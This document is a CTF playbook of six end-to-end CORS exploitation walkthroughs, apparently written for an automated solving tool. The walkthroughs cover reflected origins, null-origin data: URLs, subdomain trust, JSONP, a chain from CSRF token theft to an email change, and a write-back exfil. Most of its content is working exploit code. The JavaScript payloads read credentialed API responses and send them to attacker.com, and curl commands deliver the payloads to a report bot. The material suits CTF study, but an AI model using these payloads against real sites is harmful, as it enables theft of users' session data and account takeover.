# Walkthroughs — complete CORS solves, start to flag

End-to-end worked examples — each a full probe-to-flag run with the
commands and the evidence.

---

## Walkthrough 1 — the reflected API + a bot — the canonical solve

**The setup**: a web app at `https://t.com`, an API at `https://api.t.com`,
a `/report` bot endpoint, a flag in `/api/me` under the bot's session.

```bash
# 1. the endpoint carries the flag?
curl -s -b "$CJ" "https://api.t.com/me" 
#   {"user":"x","flag":"FLAG{...}"} — session data — the read target

# 2. the ACAO — the central measurement
curl -s -i -b "$CJ" "https://api.t.com/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-(allow-origin|allow-credentials)'
#   ACAO: https://evil.com    ← REFLECTED
#   ACAC: true                ← credentialed

# 3. the cookie — does it ride
curl -s -i -b "$CJ" "https://t.com/" | grep -i 'set-cookie'
#   session=...; SameSite=None; Secure → attaches to cross-site fetches
```

**The exploit page** (hosted at `https://attacker.com/page`):

```html
<!doctype html><script>
fetch('https://api.t.com/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://attacker.com/?d='+btoa(JSON.stringify(d))))
 .catch(e=>fetch('https://attacker.com/?err='+e))
</script>
```

**The delivery**:

```bash
curl -X POST "https://t.com/report" \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker.com/page"}'
```

**The readback**:

```bash
python3 tools/web/oob_listener.py hits
#   GET /?d=eyJ1c2VyIjoiYWRtaW4iLCJmbGFnIjoiRkxBR3suLi59In0=
# decode → the bot's session data → FLAG{...}
```

**The flag gate**:

```bash
python3 tools/hooks.py pre-flag --value 'FLAG{...}' \
  --source 'GET /?d=<b64>' --evidence '<the exfil hit>'
```

---

## Walkthrough 2 — the `null` origin + a data: URL bot

**The setup**: a strict-looking CORS, an airgapped bot, a flag in
`/api/flag` on `127.0.0.1` (the bot's own network).

```bash
# the check is a strict allowlist — but 'null' is in it
curl -s -i -b "$CJ" "http://127.0.0.1/api/flag" -H 'Origin: null' | \
  grep -i 'access-control-allow-origin'
#   ACAO: null + ACAC:true → a null-origin read
```

**The exploit** — a data: URL (the page IS the URL):

```bash
EXPLOIT='data:text/html,<script>fetch("http://127.0.0.1/api/flag",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://attacker/?d="+d))</script>'
curl -X POST "https://t.com/report" --data-urlencode "url=$EXPLOIT"
```

The bot's fetch originates `null` → passes the null-allowed CORS →
reads the flag under the bot's session → exfils.

---

## Walkthrough 3 — the token-read → CSRF-write chain

**The setup**: a CORS-open `/api/csrf` leaks the token; a CSRF-vulnerable
`/api/email` changes the email — the flag flows to the new email's
account.

```bash
# the token endpoint — CORS-open
curl -s -i -b "$CJ" "https://t.com/api/csrf" -H 'Origin: https://evil.com' | \
  grep -i 'access-control'
#   ACAO: https://evil.com  ACAC: true → the token is readable
```

```html
<script>
fetch('https://t.com/api/csrf',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t.com/api/email',{method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email:'attacker@x.com',csrf:t.token})}))
 .then(r=>fetch('https://attacker/?done='+r.status))
</script>
```

**The chain**: the CORS-read leaks the token → the CSRF-write uses it
→ the email changes → the password-reset/flag path opens.

---

## Walkthrough 4 — the subdomain-trust + a CTF-supplied sub

**The setup**: the CORS trusts `*.t.com`; the challenge gives you a
subdomain `you.t.com` to host a page.

```bash
curl -s -i -b "$CJ" "https://t.com/api/flag" -H 'Origin: https://you.t.com' | \
  grep -i 'access-control-allow-origin'
#   ACAO: https://you.t.com → the subdomain is trusted
```

Host the exploit page on `you.t.com` — the bot's fetch originates a
trusted sub → reads the flag → exfils.

---

## Walkthrough 5 — the JSONP endpoint — the script-tag read

**The setup**: `/api/me` serves JSONP when `?callback=` is given — no
CORS check on the script-tag read.

```bash
curl -s -b "$CJ" "https://t.com/api/me?callback=x" | head -1
#   x({"user":"y","flag":"FLAG{...}"}) → JSONP
```

```html
<script>function leak(d){fetch('https://attacker/?d='+JSON.stringify(d))}</script>
<script src="https://t.com/api/me?callback=leak"></script>
```

The tag's cookies ride (SameSite-gated — a Lax cookie DOES attach to
a top-level script load in some cases; check the cookie).

---

## Walkthrough 6 — the write-back exfil — an airgapped bot

**The setup**: the bot can't reach attacker.com — the read works but
the exfil can't leave. a write-back to the target lands the flag
where you can read it.

```html
<script>
fetch('https://t.com/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://t.com/api/comment',{method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({text:d.flag})}))
</script>
```

The flag lands in a public comment — you read it same-origin.

---

## The walkthrough-ledger — recording the solve

```bash
python3 tools/state.py <c> --hypothesis \
  "cors-solve: <shape> -> read /api/<ep> -> exfil-<channel> -> FLAG{...}"
python3 tools/hooks.py post-probe <c> --verdict confirms \
  --hypothesis-id <H> --class web-cors --evidence-kind impact \
  --evidence 'read /api/<ep> cross-origin; flag exfiltrated' \
  --response '<the exfil hit>'
```
